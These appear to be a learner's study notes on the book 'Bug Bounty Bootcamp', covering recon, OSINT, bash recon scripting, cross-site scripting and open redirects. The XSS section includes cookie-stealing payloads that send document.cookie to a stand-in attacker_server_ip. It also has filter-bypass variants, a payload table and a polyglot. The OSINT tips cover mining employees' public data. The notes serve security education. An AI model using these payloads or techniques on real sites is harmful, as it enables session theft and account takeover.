- Pay attention to code that deals with user input, database entries, file reads, and file uploads.
- Look for configuration files to gather more information about their infrastructure
- Look for old endpoint s and S3 bucket URLs that you can attack.

- Outdated dependencies and the unchecked use of dangerous functions are also a huge source of bugs.
- Pay attention to dependencies and imports being used and go through the versions list to see if they're outdated.
- Search for publicly disclosed vulnerabilities that would work on your target based on these outdated dependencies and imports.

Tools:

- [Gitrob](https://github.com/michenriksen/gitrob/): locates potentially sensitive files pushed to public repositories on Github.
- [TruffleHog](https://github.com/trufflesecurity/truffleHog/): specializes in finding secrets in repositories by conducting regex searches and scanning for high-entropy strings.

**Other Sneaky OSINT Techniques**

- Lookup engineer positions at the target Company
  - look for what tech is required as this will give you an idea of what tech is used by the company
- Can look for known employees github accounts, stackoverflow and Quora posts for insites into bugs/tech stack/etc.
- Look for employee accidental calendar public shares
- Social media sleuthing
  - Looking for images of post-it notes, badges with information, etc.
- Check Pastebin accounts and SlideShare
- Can use [PasteHunter](https://github.com/kevthehermit/PasteHunter/) to scan for publicly pasted data.
- Check the [Wayback Machine](https://archive.org/web/)
  - Used to find old endpoints, directory listings, forgotten subdomains, URLs, and files that are outdated but still in use.
  - [Waybackurls](https://github.com/tomnomnom/waybackurls/) to automatically extract end points and URLs from the Wayback machine.

**Tech Stack Fingerprinting**

- Use nmap with the -sV flag to perform version detection
- Send an HTTP request via burp or zap to check the HTTP headers for tech stack information
- Check the HTML source code for clues (search with CTRL+f for specifics)
- Use a browser extention like [wappalyzer](https://www.wappalyzer.com/)
- Use a website like [BuiltWith](https://builtwith.com/) or [StackShare](https://stackshare.io/) to look up infrastructure info
- Use [Retire.js](https://github.com/RetireJS/retire.js), which is a command line tool, to scan JavaScript for outdated libraries and vulnerabilities

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

#### Writing Your Own Recon Scripts

- Redirection Operators:
  - PROGRAM > FILE_NAME
    - Writes or Overwrites a file with the contents generated by PROGRAM
  - PROGRAM >> FILE_NAME
    - Appends the ouput to FILE_NAME
  - PROGRAM < FILE_NAME
    - Reads a file into PROGRAM
  - PROGRAM1 | PROGRAM2
    - Uses output from PROGRAM1 as input for PROGRAM2

**Understanding Bash Scripting Basics**
See [Scripts/recon.sh](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/recon.sh).

- I've but together one file that has multiple iterations of the examples found in the book. Each individual script starts with a description and a shebang (`!#/bin/bash`) so that you can easily separate them.

**Parsing the Results**

- nmap grep command to simplify results to only PORT STATE SERVICE:
  - `grep -E "^\S+\s+\S+\s+\S+$" DIRECTORY/nmap > DIRECTORY/nmap_cleaned`
  - -E tells grep you're using a regex
  - regex consist of two parts: constants and operators.
    - Constants are sets of strings, operators are symbols that perform operations on the strings.
  - Regex operators that represent characters:
    - \d matches any digit.
    - \w matches any character.
    - \s matches any whitespace.
    - \S matches any non-whitespace.
    - . matches with any single character.
    - \ escapes a special character.
    - ^ matches the start of the string or line.
    - $ matches the end of the string or line.
    - \* matches the preceding character zero or more times.
    - \+ matches the preceding character one or more times.
    - {3} matches the preceding character three times.
    - {1, 3} matches the preceding character one to three times.
    - {1, } matches the preceding chracter one or more times.
    - [abc] matches one of the characters within the brackets.
    - [a-z] matches one of the characters within the range of a to z.
    - (a|b|c) matches either a or b or c.
  - Using this info, we can understand that our regex "^\S+\s+\S+\s+\S+$" means we should extract lines with 3 strings separated by 2 white spaces.
    - You can tell because we have 3 S (none-whitespaces = strings) and 2 s (whitespaces).
  - For regex syntax check out [RexEgg's cheat sheet](https://www.rexegg.com/regex-quickstart.html)

**Building a Master Report**

- Parse JSON files from crt.sh with jq using: `jq -r ".[] | .name_value" $DOMAIN/crt`
  - The "-r" flag tells jq to write the output to standard output rather than formatting it as JSON strings.
  - The .[] iterates through the array within the JSON file.
  - .name_value extracts the name_value field of each item.
  - $DOMAIN/crt is the input file to the jq command.
  - learn more about [jq](https://stedolan.github.io/jq/manual/)
- Combine all output files into a master report with [this script](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/recon.sh).

**Scanning Multiple Domains**

- We use the getopts tool to parse options from the command line by using single character flags.
- To implement multi-domain scanning functionality, we can assign the -m flag to specify the scan mode and assume that all other arguments are domains.
  - Tell `getopts` to recognize an option if the option flag -m is used and that this option should contain an input value.
  - The getopts tool automatically stores the value of any options in the $OPTARG variable.
  - We can store that value in the variable `MODE`.
    - `getopts "m:" OPTION`
      `MODE=$OPTARG`
  - getopts stop parsing arguments when it encounters an argument that doesn't start with a - character.
    - Because of this, you'll need to place the scan mode before the domain arguments when running the script.
    - ex. `.recon.sh -m nmap-only facebook.com fbcdn.net`
- We need to use a loop to iterate through our domains.
  - When you know how many values you will be looping through, use a for loop.
  - When you dont know how many value you will be looping through, use a while loop.
- Bash for loop syntax:
  - `for i in LIST_OF_VALUES
do
  DO SOMETHING
done`
- Implementing the functionality:

```
for i in "${@:$OPTIND:$#}"
do
  # Do the scans for $i
done
```

- "${@:$OPTIND:$#}" is an array that contains every command line argument, besides the ones that are already parsed by getopts. It stores the index of the first argument after the options it parses into a variable named `$OPTIND`.

  - $@ represent the array containing all input arguments.
  - $# is the number of the command line arguments passed in.
  - "${@:OPTIND:}" slices the array so that it removes the MODE argument, like nmap-only, making sure that we iterate through only the domains part of our input.
  - Array slicing is a way of extracting a subset of items from an array.
  - Bash array slicing syntax:
    - "${INPUT_ARRAY:START_INDEX:END_INDEX}"
      - the quotes (" ") around the command are necessary.

- The following are bash comparison evaluators you can use to change the functionality depending on what you're doing:
  - -f flag tests whether a file exists.
  - -eq tests if something equals something else. `if [ $3 -eq 1 ]`
  - -ne tests if something is not equal to something else. `if [ $3 -ne 1 ]`
  - The following are tests for greater than, less than, and their equal to variations:
    - `if [ $3 -gt 1 ]`
    - `if [ $3 -ge 1 ]`
    - `if [ $3 -lt 1 ]`
    - `if [ $3 -le 1 ]`
  - -z and -n flags test whether a string is empty, the following are both true:
    - `if [ -z "" ]`
    - `if [ -n "abc" ]`
  - -d, -f, -r, -w, -x, check for directory or file statuses. The following will all return true if the files, directories, or permissions are exists or are true:
    - `if [ -d /bin ]`
    - `if [ -f /bin/bash ]`
    - `if [ -r /bin/bash ]`
    - `if [ -w /bin/bash ]`
    - `if [ -x /bin/bash ]`
  - You can also use the && and || operators to combine and test expressions.
  - The following returns true if both expressions are true:
    - `if [ $3 -gt 1 ] && [ $3 -lt 3 ]`
  - The following returns true if at least one of them is true:
    - `if [ $3 -gt 1 ] || [ $3 -lt 0 ]`
  - You can find more comparison flags in the test command by running `man test` (if you have man installed)

**Writing a Function Library**
"As your codebase get larger, you should consider writing a _function library_ to reuse code. We can store all the commonly used functions in a separated file called scan.lib. That way, we can call these functions as needed from future recon tasks." Alright, lets do it!

- Create a file called scan.lib and add the functions we have so far. See the scripts under "# A variation of the script utilizing a function library:" in [recon.sh](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/recon.sh). The function library can be found in [scan.lib](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/recon.sh)
- "You might build multiple networking tools that all require DNS resolution. In this case, you can simply write the functionality once and use it in all of your tools"

**Building Interactive Programs**

- To make an interactive program, we will need to utilize while loops. As long as the CONDITION is true, the while loop will execute the code between do and done repeatedly.
- ex.:
  `while CONDITION
do
  DO SOMETHING
done`
- We can use a while loop to repeatedly prompt the user for a new domain until they quit the program:
  `while [ $INPUT != "quit" ];do
  echo "Please enter a domain:
  read INPUT
  if [ $INPUT != "quit" ];then
    scan_domain $INPUT
    report_domain $INPUT
  fi
done`
- to invoke the -i option, we can use a while loop to parse option by using getopts repeatedly.
  `while getopts "m:i" OPTION;do
  case $OPTION in 
    m)
      MODE=$OPTARG
      ;;
    i)
      INTERACTIVE=true
      ;;
  esac
done`
- The final version of the script (this one including the interactive mode), can be found in the standalone script [recon.sh]()
- "Interactive tools can help your workflow operate more smoothly. For example, you can build testing tools that will let you choose how to proceed based on preliminary results."

**Using Special Characters**

- In Unix, commands return 0 on success and a positive integer on failure.
- `$?` contains the exit value of the last command executed.
- You can test for execution success and failures with something like this:
  `#!/bin/sh
chmod 777 scripts.sh 
if [ "$?" -ne "0";then
  echo "Chmod failed. You might not have permissiosn to do that."
fi`
- `$$` contains the current process's ID.
  - This special variable can be useful when you run multiple instances of the same script and need to create temporary files for that script.
  - To do this, use something like `/tmp/script_name_$$` to separate the different temporary files by process ID.
- "Variables that aren't input parameters are global to the entire script. If you want other programs to use the variable as well, you need to export the variable:
  `export VARIABLE_NAME=VARIABLE_VALUE"
  - I commonly do this with things like the IP address I'm pen-testing (if singular): `export IP=192.168.0.45`
  - "If you don't export a variable or source it in another script, the value gets destroyed after the scripts exists. But if you export the (variable) in the first script and run the script and run the script before running a second script, the second script will be able to read (the variables) value."
- `*` stands for all.
  - to list all files in the directory that end in the extension .txt you can use: `ls *.txt`
- Backticks "`" indicate command substitution. They can be used in place of $().
- `echo $(whoami)` can be written as:
  ```
  echo `whoami`
  ```
- Special characters are not read as special characters if placed in quotes.
  - `echo "abc '*' 123"` will print the string: `"abc '*' 123"`
- The backslash is the escape character.
  - Here's some good examples from the book:
  - "`$ echo "\" is a double quote.\$ is a dollar sign.`
  - `` \` is a backtick. \\ is a blackslash."``
  - You can also use a \ to indicate that a line of code has not ended after the line break:
  - `chmod 777 \
script.sh` - This is the same as: `chmod 777 script.sh`
- At the end of this section, the author suggests using building automation scripts as a way to build your hacking methodology. They also suggest to make a directory for your scripts and organize them by different categories (recon, fuzzing, automated reporting, etc).
  - organizing your scripts and making function libraries is a good way to be able to easily incorporated new tools into your hacking workflow.

**Scheduling Automatic Scans**

- We will use _Cron_ to schedule our scripts.
- Edit your users _crontabs_ by running `crontab -e`
- Crontab syntax:
  `A B C D E command_to_be_executed
A: Minute (0 - 59)
B: Hour (0 - 23)
C: Day (1 - 31)
D: Month (1 - 12)
E: Weekday (0 - 7) (Sunday is 0 or 7, Monday is 1)`
- The `run-parts` command in crontabs tells Cron to run all the scripts stored in a directory.
  - ex: `30 21 * * * run-parts /Users/vickie/scripts/security`
  - This command will run all of the scripts located in /Users/vickie/scripts/security at 9:30PM.
- Schedule a diff tasks to compare scans to see if anything has changed between two scans: `diff SCAN_1 SCAN_2`
  - This can help to identify new domains, subdomains, endpoints, and other new assets of a target when they appear in a new scan of the same domain.
  - Sample script:
    `#!/bin/bash
DOMAIN=$1 
DIRECTORY=$DOMAIN_recon
echo "Checking for new changes about the target: $DOMAIN.\n Found these new things."
diff <SCAN AT TIME 1> <SCAN AT TIME 2>`
  - You would then schedule this script to run at an interval that makes sense to you.
- Github has a Notification feature that will tell you when significant events on a repository occur.
  - Turn it on by navigating to Settings > Notifications, then set up an email for github to send notifications to, to get alerts.
  - You then just need to setup a crontab for updating your github repo, or write the updating of github repos into your scripts.

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Cross-site Scripting

- Cross-site scripting vulnerabilities are one of the most common web vulnerabilities (As of 2020, but they're still quite common).

#### Mechanisms

- "In an XSS attack, the attacker injects an executable script into HTML pages viewed by the user. This means that to understand XSS, you'll have to first understand JavaScript and HTML syntax"
- Here's an HTML syntax [cheat sheet](https://web.stanford.edu/group/csp/cs21/htmlcheatsheet.pdf) found on Stanford University's website.
- Here's a JavaScript syntax [cheat sheet](https://www.codewithharry.com/blogpost/javascript-cheatsheet/) from codewithharry.com.

- In HTML, look for the <script></script> tags.
- When you find <script></script> tags embedded in HTML files, you're looking at an "inline" script. That is to say, they're embedded in the HTML of the page, and not loaded from an external file.
  - These are great targets to test for XSS.
- An example of an inline script:

```
<h1>Welcome to my site.</h1>
<h3>This is a cybersecurity newsletter that focuses on bug bounty news and write-ups. Please subscribe to my newsletter below to receive new cybersecurity articles in your email inbox.</h3>
<form action="/subscribe" method="post">
  <label for="email">Email:</label><br>
  <input type="text" id="email" value="Please enter your email.">
  <br><br>
  <input type="submit" value="Submit">
</form>
```

- The confirmation HTML looks like this:

```
<p>Thanks! You have subscribed <b>user@gmail.com</b> to the newsletter.</p>
```

- If the user were to submit `<script>location="http://attacker.com;</script>` into the email field, and the website doesn't validate or sanitize the user input, their source code would become, `<p>Thanks! You have submitted <b><script>location="http://attacker.com";</script></b> to the newsletter.</p>`
- Validating user input: The application checks that the user input meets a certain standard - like not containing malicious code or follows some sort of structural guide.
- Sanitizing user input: The application modifies special characters in the input that can be use to interfere with HTML logic before processing.
- The `src` attribute of the HTML <script> tag allows you to load JavaScript from an external source.
  - `<script src=http://attacker.com/xss.js></script>` will execute the contents of http://attacker.com/xss.js in the victim's browser.
  - This is not very useful, because the attacker can only redirect themselves to the attack website.
- If the website allows users to subscribe to the service by visiting a URL like "https://subscribe.example.com?email=SUBSCRIBER_EMAIL" to automatically subscribe after visiting the URL, the attacker can inject the script by tricking users into visiting a malicious URL like, `https://subscribe.example.com?email=<script>location="http://attacker.com";</script>`
  - The malicious script get incorporated into the page and the victim's browser will think the script is part of that site.
  - The injected script can then access any resources that the browser stores for that site (cookies, session tokens, etc.).
  - This can be used to steal user information that can then be used to bypass access controls.
- To steal cookies by making the victim's broswer send a request to the attacker's IP with the victim's cookie as a URL parameter, you could use something like the following:
  `<script>image = new Image();
image.src='http://attacker_server_ip/?c='+document.cookie;</script>`
  - This script contains JavaScript to load an image from the attacker's server with the user's cookies as part of the request.
- XSS can be used to execute actions on the victim's behalf, modify the webpage the victim is viewing, read the victim's sensitive information (CSRF tokens, credit card numbers, and any other details rendered on their page)

#### Types of XSS

Stored XSS (Includes Blind XSS), Reflected XSS, DOM-based XSS.

- The difference between these types is how the XSS payload travels before it gets delivered to the victim users.

**Stored XSS**

- When user input is stored on a server and retrieved unsafely.
- "When an application accepts user input without validation, stores it in its servers, and then renders it on users' browsers without sanitization, malicious JavaScript code can make its way into the database and then to victim's browsers."
- Stored XSS is the most severe XSS type.
  - This is because it can attack the most amount of users.
- In the worst case scenario, all a user would need to do to become a victim is to view a page that has the payload embedded in it.
- You can inject the script in the application's user database, in their server logs, on a message board, or in a comment field.
  - Every time a user accesses the stored information, the XSS executes in their browser.
  - ex.: If you find a comment field on a blog that is vulnerable to XSS, an attack can submit a comment with JavaScript code and have that code executed by any user who views the blog post.
- Proof of Concept (POC) for XSS: generate a pop-up on the victim's browser:
  `<p><script>alert('Vulnerable to XSS');</script></p>`
  - Here's what it could look like in the HTML of a vulnerable comment section:
  ```
  <h2>Regular User's message</h2>
  <p>What a great post!</p>
  <h2>Attacker's message</h2>
  <p><script>alert('Vulnerable to XSS')</script></p>
  ```
  - In this example, the attackers message won't be shown in the comment section because it is interpreted as a script. If successful, the pop-up alert will be displayed instead.

**Blind XSS**

- "_Blind_ XSS vulnerabilities are stored XSS vulnerabilities whose malicious input is stored by the server and executed in another part of the application or in another application that you cannot see."
- Blind XSS can be used to attack administrators (by submitting XSS payloads to support staff through ticketing portals, for example), exfiltrate data, and compromise their accounts.

**Reflected XSS**

- "_Reflected_ XSS vulnerabilities happen when user input is returned to the user without being stored in a database. The application takes in user input, processes it server-side, and immediately returns it to the user."
- "These issues often happen when the server relies on user input to construct pages that display search results or error messages."
- Example: A website has a search field that is vulnerable to Reflected XSS.
  - When used as intended, the response might look something like this if you search "adc":
    `<h2>You searched for abc; here are the results!</h2>`
  - If you inject an XSS payload into the search parameter, it may look something like this:
    `https://example.com/search?q=<script>alert('Vulnerable to XSS');</script>`
    - After injecting the XSS payload and the website generates the new page containing the search results (or in this case our malicious payload), the attacker would then share the link to the malicious page to attack users.
    - The benefit here is you could have a URL that looks like one people trust, but is in fact malicious.
    - ex.: www.facebook.com/search?q=<XSSpayload>
    - This requires the attacker to get victims to click the malicious link.

**(Document Object Model) DOM-Based XSS**

- "_DOM-based_ XSS is similar to reflected XSS, except that in DOM-based XSS, the user input never leaves the user's browser. In DOM-based XSS, the application takes in user input, processes it on the victim's browser, and then returns it to the user."
- A "DOM" is a model that browsers use to render a web page.
- A DOM represents a web page's structures which defines basic properties and behavior for each HTML element and helps scripts access and modify the contents of the page.
- DOM-Based XSS targets the DOM directly; it attacks the client's local copy of the web page, it does not go through the server.
- JavaScript libraries like jQuery are often subject to DOM-Based XSS because they dynamically alter DOM elements.
- The XSS script is never sent to the server, so the HTTP response from the server doesn't change.
- ex.: A website allows the user to change their locale by submitting to a URL parameter:
  `https://example.com?local=north+america`
  - Submitting this will generate a client side response similar to:
    `<h2>Welcome, user from North America!</h2>`
  - This submission is used locally by the user's browser with a client-side script.
  - If the submission is not validated by the client-side script, the attacker could trick victim's into visiting a URL like:
    `https://example.com?local=<script>location='http://attacker_server_ip/?c='+document.cookie;</script>`
- "The user input fields that can lead to reflected and DOM-based XSS aren't always URL parameters. Sometimes they show up as URL fragments or pathnames."
  - URL _fragments_ are strings, located at the end of a URL, that begin with a # character.
  - Github uses these a lot to allow content creators to link to different sections within a longer .md file (like this one, you can view the RAW version of this document and see where the Table of Contents (TOC) links to different sections).
- Information and payload examples from [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dom-based/)

**Self-XSS**

- "_Self-XSS_ attacks require victims to input a malicious payload themselves. To perform these, attackers must trick users into doing much more than simply viewing a page or browsing to a particular URL."
- "If you've ever seen social media posts or text messages telling you to paste a piece of code into your browser to "do something cool," it was probably attack code aimed at tricking you into launching self-XSS against yourself.
- These are often out of scope, because they require you to use social engineering to attack users directly.

**Prevention**

- Two main controls to prevent XSS:
  - Robust input validation.
  - Contextual output escaping and encoding.
- Apps should never insert user-submitted data directly into an HTML document.
  - Including inside <script> tags, HTML tag names, or attribute names.
  - The server should validate the user-submitted input doesn't contain dangerous characters that might influence the way browsers interpret the information.
  - You could block all requests that contain the <script> tag, for example, or sanitize it by removing or escaping special characters before further processing.
- Escaping is when you encode special characters so that they're interpreted literally instead of as special characters.
  - Encoding must be done in the format of the language being used (JavaScript for JavaScript, HTML for HTML, XML, JSON, CSS, etc.)
  - For HTML, "<" and ">" can be escaped with &lt and &gt.
- Escaping special characters so that the application won't interpret user input as code to execute is the most common way for modern apps to protect against XSS attacks.

  - React, Angular 2+, and Vue.js do this automatically, so choosing the right framework is a great way to protect your applications.

- DOM-based XSS, however, doesn't get passed to the server, so sanitization won't work.
- To protect against DOM-based XSS, devs should avoid code that rewrites the HTML doc based on user input, and should implement client-side input validation before it's inserted into the DOM.

- To mitigate against the damage of successful XSS attacks:
  - Set the `HttpOnly` flag on sensitive cookies to prevent attackers from stealing those cookies.
  - Implement the `Content-Security-Policy` response header to restrict how resources like JavsScript, CSS, or images load on your web pages.
  - You can instruct the browser to execute only scripts from a list of sources.
  - Visit [OWASP XSS prevention cheat sheet](https://cheatsheetseries.owasp.org/cheatsheet/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) for even more info.

#### Hunting for XSS

- Look for places where user input get rendered on a page, check for reflected user input.
- You can look for XSS in applications that communicate via non-HTTP protocols like SMTP, SNMP, DNS.
  - The book suggestion checking out [Offensive Security's Advanced Web Attacks and Exploitation Training](https://www.offensive-security.com/awae-oswe/) if you're interested in these techniques.

**Step 1: Look for Input Opportunities**

- For Stored XSS, look for places where input get stored by the server and later displayed to the user: Comment fields, user profiles, and blog posts.
- For Reflected XSS, look for forms, search boxes, name and username fields in sign-ups.
- Don't limit yourself to text input fields. Drop-down menus and numeric fields also can allow for XSS through the use of a proxy (like BuprSuite).

  - ex:

  ```
  POST /edit_user_age

  (Post request body)
  age=20
  ```

  - Could be tested with:

  ```
  POST /edit_user_age

  (Post request body)
  age=<script>alert('Vulnerable to XSS');</script>
  ```

- For reflected and DOM XSS, look for user input in URL parameters, fragments, or pathnames that get displayed to the user.
  - Insert a custom string into each URL parameter and check whether it shows up in the returned page. Make the string very specific to make sure it was caused by the submission.
  - Input the string "Vulnerable to XSS" into every user-input opportunity you can find, then search the pages source code for it with ctrl+f.

**Step 2: Insert Payloads**

- Once you've found some user input opportunities, start testing with XSS payloads. An alert payload is simple and effective:
  `<script>alert('Vulnerable to XSS');</script>`

  - This is nice because you get a pop-up if the attack is successful.
  - This is less likely to work on modern web apps, but is more likely to work on IoT or embedded applications that don't use the latest frameworks.
  - For IoT learning check out OWASP's [IoTGoat project](https://github.com/OWASP/IoTGoat/)

- Changing the values of attributes in HTML tags is another way to try to sneak a payload into a web application.
  - ex. of the `onload` event attribute running a script after the HTML element has loaded (similar for `onclick` and `onerror` event attributes):
    `<img onload=alert('The image has been loaded!') src="example.png">`
  - You can try inserting code into these attributes or adding a new event attribute into an HTML tag.
- Try to achieve an XSS through special URL schemes like `javascript:` and `data:`.

  - `javascript:` URL scheme allows you to execute JavaScript code specified in the URL.
    `javascript:alert('Vulnerable to XSS')`
  - The `data:` scheme allows you to embed small files in a URL, including JavaScript code:
    `data:text/html:base64,PHNjcmlwdD5hbGVydCgnVnVsbmVyYWJsZSB0byBYU1MnKTwvc2NyaXB0Pg==`
  - The above is the base64 encoded version of: `data:text/html:base64.<script>alert('Vulnerable to XSS')</script>`
  - You don't need to base64 encode, but it's always a good idea to try this if a non-encoded payloads don't work as it can help bypass XSS filters (and any other injection filters for that matter).
  - For more ways to execute JavaScript by bypassing XSS protection you can look on PortSwigger's [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/) for payload examples.
  - It can be helpful to use multiple browsers to test for XSS because different browsers support different tags and event handlers.

- "When inserting an XSS payload, you'll often have to close out a previous HTML tag by including its closing angle bracket. This is necessary when you're placing your user input inside one HTML element but want to run JavaScript using a different HTML element."
  - Doing this avoids syntax errors.
  - ex:
    `<img src="USER_INPUT">`
  - To close out the tag, you would need supply the following to the input field:
    `"/><script>location="http://attacker.com";</script>`
  - The target would then receive this:
    `<img src=""/><script>location="http://attacker.com";</script>">`
  - Use a proxy to check if the payload has caused syntax errors in the returned document.
  - Use your browser to see if there are any errors loading the page.

Table 6-1: Common XSS Payloads  
 |Payload|Purpose|
|---|---|
|`<script>alert(1)</script>`| This is the most generic XSS payload. It will generate a pop-up box if the payload succeeds|
|`<iframe src=javascript:alert(1)>`| This payload loads JavaScript code within an iframe. It's useful when <script> tags are banned by the XSS filter|
|`<body onload=alert(1)>`| This paylaod is useful when your input string can't contain the term _script_. It inserts an HTML element that will run JavaScript automatically after it's loaded.|
|`"><img src=x onerror=prompt(1);>`| This payload closes out the previous tag. It then injects an <img> tag with an invalid source URL. Once the tag fails to load, it will run the JavaScript specified in the onerror attribute.|
|`<script>alert(1)<!-`| <! is the start of an HTML comment. This payload will comment out the rest of the line in the HTML document to prevent syntax errors.|
|`<a onmouseover"alert(1)">test</a>`| This payload inserts a link that will cause JavaScript to execute after a user hovers over the link with their cursor.|
|`<script src=//attacker.com/test.js>`|This payload causes the browser to load and run an external script hosted on the attacker's server.|

- Instead of testing the many payloads one by one to see if the application you're working on is vulnerable, you can use a polyglot.
  - A polyglot is a payload that executes in multiple contexts - it will execute regardless of being inserted into an <img> tag, a <script> tag, or a generic <p> tag and can also bypass some XSS filters.
- ex. from [EdOverflow](https://polyglot.innerht.ml/):

```
javascript:"/*\"/*' /*</template>
</textarea></noembed></noscript></title>
</style><script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```

- The above polyglot contains multiple ways of creating an XSS so if one method fails, another method could still work.
- Another efficient way of testing for XSS is to use generic test strings like: `>'<"//:=;!--`
  - You can use a generic string like this to see which special characters are escaped, and which ones aren't.
  - If you find that some or all of the special characters are not escaped, you can then build a payload around the ones that aren't.
- Blind XSS are harder to detect because you cannot see the reflected input, and you can't test them by generating an alert box.
  - To test them, you'll need to try to make a victim's browser generate a request to a server of your own.
  - ex: Submit the following payload which will make the victim's browser request the page /xss on your server:
    `<script src='http://YOUR_SERVER_IP/xss'></script>`
  - You will then inspect your server logs to see if anyone requests that page. If you see a request to /xss, the XSS was successful.
- Fuzzing is a great way to test for XSS automatically is through fuzzing. This is covered in Chapter 25.
  - Note: Hackers generally discover new XSS manually, but a good way to find out where to start can be done through fuzzing.

**Step 3: Confirm the Impact**

- Keep in mind that the site may use the user input to construct something other than the next returned page.
  - Your input should be use to construct other web pages, email, and file portals.
  - There may be a time delay between when you submit the payload and when it executes. Common in log files and analytics pages.
    - If targetting log files and analytic pages, your payload may be executed later or in another users account.
  - Payloads may only execute under certain conditions, like an admit being logged in, or when the user actively clicks or hovers certain HTML elements.
  - Browse to the necessary pages and perform these actions yourself - if possible.

#### Bypass XSS Protection

**Alternative JavaScript Syntax**

- `<script><script/>` tags are often filtered out, instead you could use an HTML image tag, `<img src="USER_INPUT">`
- Instead of closing out an img tag and inserting a script tag (`<img src="/><script>alert('Vulnerable to XSS');</script>"/>`), you could insert the JavaScript directly as an attribute to the current tag: `<img src="123" onerror="alert('Vulnerable to XSS');"/>`
- Use the special URL schemes from earlier: `<a href="javascript:alert('Vulnerable to XSS')>Click me!</a>"`

**Capitalization and Encoding**

- "You can also mix different encodings and capitalizations to confuse the XSS filter. For example, if the filter filters for only the string "script", capitalize certain letters in your payload": `<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>`
- If the app filters special HTML characters like single and double quotes, you could use the JavaScript `fromCharCode()` function which maps numeric codes to the corresponding ASCII characters.
  - The following is equivalent to `"http://attacker_server_ip/?c="`:
    `String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)`
  - Using this in conjunction with capitalization could look like this: `<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookies;</scrIPT>`
  - You can convert strings using an online JavaScript editor like [https://js.do/](https://js.do) by copying the following code and changing `encoded = "INPUT_STRING"` to whatever you're trying to translate and then clicking the "Run code" button on the top left of the code window:
    ```
    <script>
    function ascii(c){
      return c.charCodeAt();
    }
    encoded = "INPUT_STRING".split("").map(ascii);
    document.write(encoded);
    </script>
    ```
  - I've written a python script to be able to convert strings locally or to be used in a larger framework [here](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/convert_to_charcode.py).

**Filter Logic Errors**

- "...sometimes application remove all `<script>` tags in the user input to prevent XSS, but do it only once. If that's the case, you can use a payload like this:"
  `<scrip<script>t>
location='http://attacker_server_ip/c='+document.cookie;
</scrip</script>t>`
  - By cutting the script tag in two, the filter may not recognize the broken script tag and once the complete script tag is removed, the intact script tag forms the payload.
- XSS protection is hard to do right, that's why XSS is still prevalent today.
- More filter-bypass ideas on OWASP's XSS filter evasion [cheat sheet](https://owaps.org/www-community/xss-filter-evasion-cheatsheet).
  - Or, Google XSS "filter bypass".

**Escalating the Attack**

- Stored XSS on a public forum can attack anyone who visits the forum page, and is considered the most severe.
- Reflected or DOM XSS can only affect users who click the malicious link.
- If you find a stored XSS vulnerability in server logs, the XSS can take over admin sessions.
  - If you can take over one of these high privileged accounts, the XSS could compromise the integrity of the entire application.
  - You could gain access to customer information, internal files, API keys, you might even be able to escalate into RCE by uploading a shell or execute scripts as the admin.
- You may also be able to steal the Cross Site Request Forgery (CSRF) token embedded on the victim's page. If you can steal the CSRF token, you can execute actions on their behalf by using those tokens to bypass CSRF protections (Chapter 9).
- "XSS can also be used to dynamically alter the page the victim sees, so you can replace the page with a fake login page and trick the user into giving you their credentials."
- "XSS can also allow attackers to automatically redirect the victim to malicious pages and perform other harmful operations while posing as the legit site, such as installing malware."

**Automating XSS Hunting**

- Use tools to make your XSS hunt more efficient instead of inspecting all of the different request parameters individually.
- Use browser developer tools to look for syntax errors and troubleshoot your payloads.
  - Use a proxy's search tool to search server responses for reflected input.
- Use BurpSuite or Zap to do an automatic XSS scan on the target.

**Finding Your First XSS!**

1. Look for user input opportunities on the application. When user input is stored and used to construct a web page later, test the input field for stored XSS. If user input in a URL gets reflected back on the resulting web page, test for reflected and DOM XSS.
2. Insert XSS payloads into the user input fields you've found. Insert payloads from lists online, a polyglot payload, or a generic test string.
3. Confirm the impact of the payload by checking whether your browser runs your JavaScript code. Or in the case of a blind XSS, see if you can make the victim browser generate a request to your server.
4. If you can't get any payloads to execute, try bypassing XSS protections.
5. Automate teh XSS hunting process with techniques introduced in Chapter 25.
6. Consider the impact of the XSS you've found: who does it target? How many users can it affect? And what can you achieve with it? Can you escalate the attack by using what you've found?
7. Send your first XSS report to a bug bounty program!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 7: Open Redirects

"Sites often use HTTP or URL parameters to redirect users to a specified URL without any user action. While this behavior can be useful, it can also cause _open redirects_, which happen when an attacker is able to manipulate the value of this parameter to redirect the user offsite."

**Mechanisms**

- Sites often redirect unauthenticated users to a login page when try to to access a page that requires authentication. After authentication, the user could then be redirected back to the specific page they were trying to access before authentication.
  - To redirect them back to the page they were trying to access, the site needs to remember where they were trying to go.
  - To do this, the site uses some sort of redirect URL parameter appended to the URL to keep track of the user's original location.
  - ex: `https://example.com/login?redirect=https://example.com/dashboard` will redirect a user to `https://example.com/dashboard` after they authenticate on the login page.
  - This is a very common functionality included on modern websites.
  - An attacker could provide a user with a link like `https://example.com/login?redirect=http://attacker.com`
    - The victim may see the familiar https://example.com and not notice that it's redirecting somewhere else. The malicious website attacker.com could then try to emulate the login page of the real website to phish for credentials.
- Referer-based open redirects use the `referer` HTTP request header that browsers automatically include.
  - Attackers can host a site that links to the victim site to set the referer header of the request using HTML like this:
    ```
    <html>
    <a href="https://example.com/login">Click here to login to example.com<a/>
    </html>
    ```
  - This uses a <a> tag that links the text in the tag to another location.
